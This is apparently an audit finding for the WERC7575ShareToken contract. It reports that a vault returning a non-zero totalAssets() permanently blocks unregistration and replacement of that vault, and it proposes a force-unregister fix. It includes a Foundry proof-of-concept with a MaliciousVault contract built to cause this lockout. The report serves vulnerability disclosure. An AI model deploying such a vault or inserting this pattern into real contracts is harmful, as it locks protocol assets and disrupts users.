## Title
Malicious Vault Can Permanently Lock Asset Registry Through totalAssets() Manipulation

## Summary
The `unregisterVault()` function in WERC7575ShareToken performs safety checks by calling `totalAssets()` on the vault contract to verify no user funds remain before allowing unregistration. A malicious vault can deliberately return non-zero values from `totalAssets()` to block unregistration indefinitely. Since the protocol enforces a one-vault-per-asset constraint, this permanently prevents registration of a replacement vault for that asset.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The unregistration mechanism should verify that a vault has no outstanding user funds before removing it from the registry, preventing user fund loss while allowing legitimate vault replacement.

**Actual Logic:** The function relies on untrusted external calls to the vault being unregistered:
1. First calls `IERC7575Vault(vaultAddress).totalAssets()` and reverts if non-zero
2. Second calls `ERC20(asset).balanceOf(vaultAddress)` and reverts if non-zero

A malicious vault can exploit this by implementing `totalAssets()` to always return a non-zero value, OR by permanently holding 1 wei of the asset token.

**Exploitation Path:**
1. **Initial State**: Owner registers a malicious vault for an asset (e.g., USDC) [2](#0-1) 
2. **Malicious Vault Behavior**: The vault implements `totalAssets()` to return `type(uint256).max` or any non-zero value, regardless of actual holdings
3. **Unregistration Blocked**: When owner attempts to unregister the vault, the check at line 265-266 reverts: `if (totalAssets != 0) revert CannotUnregisterVaultAssetBalance()`
4. **New Vault Blocked**: Owner cannot register a replacement vault because of the `AssetAlreadyRegistered` check [3](#0-2) 

**Security Property Broken:** Violates Invariant #6 (Asset-Vault Mapping bijection should be manageable) - the protocol loses the ability to update vault mappings for affected assets.

## Impact Explanation

- **Affected Assets**: Any asset (USDC, USDT, DAI, etc.) for which a malicious vault is registered becomes permanently locked
- **Damage Severity**: Complete loss of functionality for that asset class - no deposits, no redemptions, no legitimate vault operations possible
- **User Impact**: All users attempting to use that asset are forced to interact with the malicious vault or cannot use the protocol at all for that asset

## Likelihood Explanation

- **Attacker Profile**: A malicious vault contract registered by the owner (either through initial compromise or upgrade of a previously-legitimate vault)
- **Preconditions**: 
  - Malicious vault must be registered (requires owner action initially)
  - Once registered, vault can activate malicious behavior at any time
- **Execution Complexity**: Trivial - the malicious vault simply implements `totalAssets()` to return a non-zero constant
- **Frequency**: Permanent lock - once activated, the vault cannot be unregistered

## Recommendation

Add an owner-controlled force unregister function that bypasses safety checks, with appropriate warnings and additional access controls:

```solidity
// In src/WERC7575ShareToken.sol:

/**
 * @dev Emergency function to force unregister a malicious/broken vault
 * @param asset The asset token address to force unregister
 * 
 * WARNING: This bypasses all safety checks. Only use when:
 * - Vault is confirmed malicious or broken
 * - All user funds have been independently verified as safe
 * - No alternative recovery path exists
 */
function forceUnregisterVault(address asset) external onlyOwner {
    if (asset == address(0)) revert ZeroAddress();
    if (!_assetToVault.contains(asset)) revert AssetNotRegistered();
    
    address vaultAddress = _assetToVault.get(asset);
    
    // Remove vault registration without safety checks
    _assetToVault.remove(asset);
    delete _vaultToAsset[vaultAddress];
    
    emit VaultUpdate(asset, address(0));
    emit ForceVaultUnregistered(asset, vaultAddress);
}

// Add corresponding event
event ForceVaultUnregistered(address indexed asset, address indexed vault);
```

**Alternative Fix:** Make the unregistration checks more robust by:
1. Allowing unregistration if the try-catch fails (indicating a malicious/broken vault)
2. Implementing a time-delayed unregistration mechanism
3. Adding a governance vote requirement for unregistration

## Proof of Concept

```solidity
// File: test/Exploit_MaliciousVaultLockout.t.sol
// Run with: forge test --match-test test_MaliciousVaultBlocksUnregistration -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/ERC20Faucet.sol";
import "../src/interfaces/IERC7575.sol";

contract MaliciousVault {
    address public asset;
    address public shareToken;
    
    constructor(address _asset, address _shareToken) {
        asset = _asset;
        shareToken = _shareToken;
    }
    
    // Malicious implementation - always returns non-zero
    function totalAssets() external pure returns (uint256) {
        return type(uint256).max; // Permanently blocks unregistration
    }
    
    function share() external view returns (address) {
        return shareToken;
    }
}

contract Exploit_MaliciousVaultLockout is Test {
    WERC7575ShareToken public shareToken;
    ERC20Faucet public token;
    MaliciousVault public maliciousVault;
    
    address public owner;
    
    function setUp() public {
        owner = address(this);
        
        // Deploy contracts
        token = new ERC20Faucet("Test Token", "TEST", 100000 * 1e18);
        shareToken = new WERC7575ShareToken("Test Share", "tSHARE");
        maliciousVault = new MaliciousVault(address(token), address(shareToken));
        
        // Register malicious vault
        shareToken.registerVault(address(token), address(maliciousVault));
    }
    
    function test_MaliciousVaultBlocksUnregistration() public {
        // VERIFY: Vault is registered
        address registeredVault = shareToken.vault(address(token));
        assertEq(registeredVault, address(maliciousVault), "Malicious vault should be registered");
        
        // EXPLOIT: Try to unregister - should fail due to totalAssets() returning non-zero
        vm.expectRevert(abi.encodeWithSignature("CannotUnregisterVaultAssetBalance()"));
        shareToken.unregisterVault(address(token));
        
        // VERIFY: Vault is still registered (unregistration blocked)
        registeredVault = shareToken.vault(address(token));
        assertEq(registeredVault, address(maliciousVault), "Malicious vault still registered");
        
        // VERIFY: Cannot register a new legitimate vault
        address newVault = makeAddr("newVault");
        vm.expectRevert(abi.encodeWithSignature("AssetAlreadyRegistered()"));
        shareToken.registerVault(address(token), newVault);
        
        // IMPACT CONFIRMED: Asset is permanently locked to malicious vault
    }
}
```

## Notes

This vulnerability affects both WERC7575ShareToken.sol and ShareTokenUpgradeable.sol implementations. The ShareTokenUpgradeable version uses `getVaultMetrics()` instead of `totalAssets()` [4](#0-3) , but suffers from the same fundamental issue - relying on untrusted external calls from the vault being unregistered.

The secondary `balanceOf()` check [5](#0-4)  provides minimal additional protection since a malicious vault can simply hold 1 wei of the asset token permanently to trigger the same lock condition.

The only current recovery path requires upgrading the entire ShareToken contract, which is a complex and risky operation that may disrupt all existing vault operations across all assets.

### Citations

**File:** src/WERC7575ShareToken.sol (L218-241)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();
        if (_assetToVault.contains(asset)) revert AssetAlreadyRegistered();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loops
        if (_assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault (automatically adds to enumerable collection)
        _assetToVault.set(asset, vaultAddress);
        _vaultToAsset[vaultAddress] = asset;

        emit VaultUpdate(asset, vaultAddress);
    }
```

**File:** src/WERC7575ShareToken.sol (L256-285)
```text
    function unregisterVault(address asset) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (!_assetToVault.contains(asset)) revert AssetNotRegistered();

        address vaultAddress = _assetToVault.get(asset);

        // SAFETY CHECK: Validate that vault has no outstanding assets that users could claim
        // In this architecture, we check vault's total assets rather than share supply
        // since shares are managed by this ShareToken contract, not the vault
        try IERC7575Vault(vaultAddress).totalAssets() returns (uint256 totalAssets) {
            if (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();
        } catch {
            // If we can't verify the vault has no assets, we can't safely unregister
            // This prevents unregistration if the vault is malicious or has interface issues
            revert("ShareToken: cannot verify vault has no outstanding assets");
        }
        // Additional safety: Check if vault still has any assets to prevent user fund loss
        // This is a double-check using ERC20 interface in case totalAssets() is manipulated
        try ERC20(asset).balanceOf(vaultAddress) returns (uint256 vaultBalance) {
            if (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();
        } catch {
            // If we can't check the asset balance in vault, err on the side of caution
            revert("ShareToken: cannot verify vault asset balance");
        }
        // Remove vault registration and authorization (automatically removes from enumerable collection)
        _assetToVault.remove(asset);
        delete _vaultToAsset[vaultAddress]; // Also clear reverse mapping for authorization

        emit VaultUpdate(asset, address(0));
    }
```

**File:** src/ShareTokenUpgradeable.sol (L293-313)
```text
        try IVaultMetrics(vaultAddress).getVaultMetrics() returns (IVaultMetrics.VaultMetrics memory metrics) {
            if (metrics.isActive) revert CannotUnregisterActiveVault();
            if (metrics.totalPendingDepositAssets != 0) {
                revert CannotUnregisterVaultPendingDeposits();
            }
            if (metrics.totalClaimableRedeemAssets != 0) {
                revert CannotUnregisterVaultClaimableRedemptions();
            }
            if (metrics.totalCancelDepositAssets != 0) {
                revert CannotUnregisterVaultAssetBalance();
            }
            if (metrics.activeDepositRequestersCount != 0) {
                revert CannotUnregisterVaultActiveDepositRequesters();
            }
            if (metrics.activeRedeemRequestersCount != 0) {
                revert CannotUnregisterVaultActiveRedeemRequesters();
            }
        } catch {
            // If we can't get vault metrics, we can't safely verify no pending requests
            revert CannotUnregisterActiveVault();
        }
```
